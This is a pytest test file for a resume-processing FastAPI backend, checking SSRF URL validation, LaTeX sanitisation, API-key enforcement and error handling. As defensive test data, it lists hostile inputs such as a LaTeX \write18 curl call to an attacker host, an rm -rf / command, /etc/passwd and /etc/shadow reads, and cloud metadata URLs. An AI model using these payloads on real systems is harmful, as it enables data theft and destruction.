import pytest
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient
from backend.main import app
from backend.services.scraper import validate_public_url
from backend.services.latex import sanitize_latex_source

client = TestClient(app)


# --- SSRF & URL Validation Tests ---

def test_validate_public_url_blocks_non_http_schemes():
    with pytest.raises(ValueError, match="Only HTTP and HTTPS URLs are permitted"):
        validate_public_url("file:///etc/passwd")

    with pytest.raises(ValueError, match="Only HTTP and HTTPS URLs are permitted"):
        validate_public_url("ftp://example.com/job")

    with pytest.raises(ValueError, match="Only HTTP and HTTPS URLs are permitted"):
        validate_public_url("gopher://127.0.0.1:70")


def test_validate_public_url_blocks_private_and_loopback_ips():
    # Direct IP testing
    with pytest.raises(ValueError, match="blocked"):
        validate_public_url("http://127.0.0.1:8000/job")

    with pytest.raises(ValueError, match="blocked"):
        validate_public_url("http://169.254.169.254/latest/meta-data/")

    with pytest.raises(ValueError, match="blocked"):
        validate_public_url("http://10.0.0.1/admin")

    with pytest.raises(ValueError, match="blocked"):
        validate_public_url("http://192.168.1.100/jd")

    with pytest.raises(ValueError, match="blocked"):
        validate_public_url("http://172.16.5.1/jd")


def test_validate_public_url_blocks_private_dns_resolutions():
    # Mock socket.getaddrinfo to simulate private IP resolutions
    mock_addr = [(2, 1, 6, "", ("127.0.0.1", 80))]
    with patch("socket.getaddrinfo", return_value=mock_addr):
        with pytest.raises(ValueError, match="blocked"):
            validate_public_url("http://internal-corp-service.local/job")


def test_validate_public_url_accepts_valid_public_ip():
    mock_addr = [(2, 1, 6, "", ("93.184.216.34", 80))]
    with patch("socket.getaddrinfo", return_value=mock_addr):
        # Should not raise
        validate_public_url("https://example.com/careers/123")


# --- LaTeX Sanitization Tests ---

def test_sanitize_latex_blocks_dangerous_file_inclusions():
    dangerous_payloads = [
        r"\input{/etc/passwd}",
        r"\input{/etc/hostname}",
        r"\input{../config.tex}",
        r"\input /etc/shadow",
        r"\include{/etc/passwd}",
        r"\include{../secret}",
        r"\include /var/log/syslog",
        r"\lstinputlisting{/etc/passwd}",
        r"\VerbatimInput{/etc/passwd}",
        r"\openin 1=test.txt",
        r"\read 1 to \myline",
        r"\write18{curl http://attacker.com/leak}",
        r"\immediate\write18{rm -rf /}",
        r"\catcode`\@=11",
    ]

    for payload in dangerous_payloads:
        doc = f"\\documentclass{{article}}\\begin{{document}}{payload}\\end{{document}}"
        with pytest.raises(ValueError, match="Disallowed LaTeX file inclusion"):
            sanitize_latex_source(doc)


def test_sanitize_latex_allows_safe_resume_latex():
    safe_latex = r"""
    \documentclass[11pt,a4paper]{article}
    \usepackage{hyperref}
    \begin{document}
    \section{Experience}
    \textbf{Senior Software Engineer} at Acme Corp.
    \begin{itemize}
        \item Built microservices using Python \& Docker.
        \item Improved throughput by 40\%.
    \end{itemize}
    \end{document}
    """
    # Should not raise
    sanitize_latex_source(safe_latex)


# --- Endpoint Auth & Security Tests ---

def test_process_endpoint_requires_api_key():
    response = client.post("/api/process", json={
        "resume_latex": "\\documentclass{article}\\begin{document}Test\\end{document}",
        "job_description": "Software Engineer"
    })
    assert response.status_code == 401
    assert "API key is missing" in response.json()["detail"]


def test_analyze_section_requires_api_key():
    response = client.post("/api/analyze-section", json={
        "section_latex": "\\section{Skills}",
        "job_description": "Python Developer"
    })
    assert response.status_code == 401
    assert "API key is missing" in response.json()["detail"]


def test_compile_endpoint_rejects_malicious_latex():
    response = client.post("/api/compile", json={
        "resume_latex": "\\documentclass{article}\\begin{document}\\input{/etc/passwd}\\end{document}"
    })
    assert response.status_code == 400
    assert "Disallowed LaTeX file inclusion" in response.json()["detail"]


def test_error_handling_sanitizes_internal_errors():
    # Test that unhandled upstream exceptions do not leak raw details/keys
    with patch("backend.main.ResumeOrchestrator") as mock_orch:
        mock_instance = MagicMock()
        mock_instance.side_effect = RuntimeError("Upstream Gemini API error: secret_key_12345")
        mock_orch.return_value = mock_instance

        response = client.post(
            "/api/process",
            json={
                "resume_latex": "\\documentclass{article}\\begin{document}Test\\end{document}",
                "job_description": "Software Engineer"
            },
            headers={"x-gemini-api-key": "secret_key_12345"}
        )

        assert response.status_code == 500
        # Verify secret_key_12345 or raw error message is NOT returned in response
        assert "secret_key_12345" not in response.text
        assert response.json()["detail"] == "An error occurred during resume processing. Please verify your Gemini API key and prompt."


def test_process_endpoint_rejects_ssrf_job_url():
    response = client.post(
        "/api/process",
        json={
            "resume_latex": "\\documentclass{article}\\begin{document}Test\\end{document}",
            "job_url": "file:///etc/passwd"
        },
        headers={"x-gemini-api-key": "test_key"}
    )
    assert response.status_code == 400
    assert "Only HTTP and HTTPS URLs are permitted" in response.json()["detail"]


def test_process_endpoint_rejects_internal_ip_job_url():
    response = client.post(
        "/api/process",
        json={
            "resume_latex": "\\documentclass{article}\\begin{document}Test\\end{document}",
            "job_url": "http://169.254.169.254/latest/meta-data/"
        },
        headers={"x-gemini-api-key": "test_key"}
    )
    assert response.status_code == 400
    assert "blocked" in response.json()["detail"]


def test_extract_pdf_rejects_non_pdf_files():
    response = client.post(
        "/api/extract-pdf",
        files={"file": ("test.txt", b"plain text", "text/plain")}
    )
    assert response.status_code == 400
    assert "Uploaded file must be a PDF" in response.json()["detail"]


def test_extract_pdf_rejects_empty_file():
    response = client.post(
        "/api/extract-pdf",
        files={"file": ("test.pdf", b"", "application/pdf")}
    )
    assert response.status_code == 400
    assert "Uploaded file is empty" in response.json()["detail"]

